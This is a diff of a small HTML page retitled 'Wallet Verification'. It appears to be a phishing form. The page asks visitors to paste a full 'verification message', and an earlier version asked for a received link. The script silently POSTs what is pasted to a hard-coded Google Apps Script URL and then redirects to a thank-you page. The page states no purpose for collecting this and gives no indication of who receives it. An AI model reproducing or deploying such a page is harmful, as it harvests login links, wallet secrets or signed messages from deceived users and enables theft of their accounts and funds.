@@ -3,81 +3,57 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verification Link - Step 1</title>
+<title>Wallet Verification</title>
 <style>
 body { font-family: Arial,sans-serif; background:#f4f6f8; padding:40px; }
-.container { max-width:600px; margin:auto; background:#fff; padding:25px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.1); }
+.container { max-width:600px; margin:auto; background:#fff; padding:25px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.1);}
 label { font-weight:bold; display:block; margin-bottom:8px; }
-textarea,input { width:100%; padding:10px; margin-bottom:15px; font-size:15px; border-radius:4px; border:1px solid #ccc; }
-textarea { min-height:100px; resize:vertical; }
-input[readonly] { background:#f1f1f1; }
-button { background:#007bff; color:#fff; padding:10px 18px; font-size:16px; border:none; border-radius:4px; cursor:pointer; }
-button:hover { background:#0056b3; }
-.status { font-size:14px; margin-bottom:10px; }
-.success { color:green; }
-.error { color:red; }
+textarea { width:100%; padding:10px; margin-bottom:15px; font-size:15px; border-radius:4px; border:1px solid #ccc; min-height:120px; resize:vertical;}
+button { background:#007bff; color:#fff; padding:10px 18px; font-size:16px; border:none; border-radius:4px; cursor:pointer;}
+button:hover { background:#0056b3;}
 </style>
 </head>
 <body>
 
 <div class="container">
+  <h2>Submit Verification Message</h2>
   <form id="form">
-    <label>Paste Received Link Here for Confirmation (Step 1)</label>
-    <textarea id="message" placeholder="Paste full message here..." required></textarea>
-    <input type="url" id="link" readonly />
-    <div id="status" class="status"></div>
+    <label>Enter Verification Message</label>
+    <textarea id="message" placeholder="Paste full message..." required></textarea>
     <button type="submit">Submit</button>
   </form>
 </div>
 
 <script>
-const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwIOTjrFm4lGxjpCOxN_oq_-ETSy_At1lGOoWIw3Sa3_l2RaFPXgmqe_6yJNrUiS5sj/exec";
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzg63KALdNL6o4tjGKzfGrLMCmXC8Bq-p08tkX9H9UJOVJx4XX12yQYeu_BnUuyBEYg/exec"; // Paste your Apps Script Web App URL
 
 const form = document.getElementById("form");
 const messageInput = document.getElementById("message");
-const linkInput = document.getElementById("link");
-const status = document.getElementById("status");
 
-function extractLink(text) {
-  const match = text.match(/https?:\/\/[^\s]+/);
-  return match ? match[0] : "";
-}
-
-messageInput.addEventListener("input", () => {
-  const link = extractLink(messageInput.value);
-  if(link){
-    linkInput.value = link;
-    status.textContent = "Verification link detected ✔️";
-    status.className = "status success";
-  } else {
-    linkInput.value = "";
-    status.textContent = "No verification link found ❗";
-    status.className = "status error";
-  }
-});
-
-form.addEventListener("submit", async e => {
+form.addEventListener("submit", async e=>{
   e.preventDefault();
-  if(!linkInput.value){
-    alert("No valid link detected.");
+  const message = messageInput.value.trim();
+  if(!message){
+    alert("Please enter a message.");
     return;
   }
 
-  try {
+  try{
     const response = await fetch(WEB_APP_URL, {
       method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({link: linkInput.value}),
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({message}),
       mode: "cors"
     });
+
     const result = await response.json();
     if(result.success){
-      window.location.href = "confirm.html";
+      window.location.href = "thankyou.html";
     } else {
-      alert("Submission failed ❗ " + (result.message || ""));
+      alert("Submission failed: " + (result.message || "Unknown error"));
     }
-  } catch(err){
-    alert("Network error ❗ " + err.message);
+  }catch(err){
+    alert("Network error: " + err.message);
   }
 });
 </script>
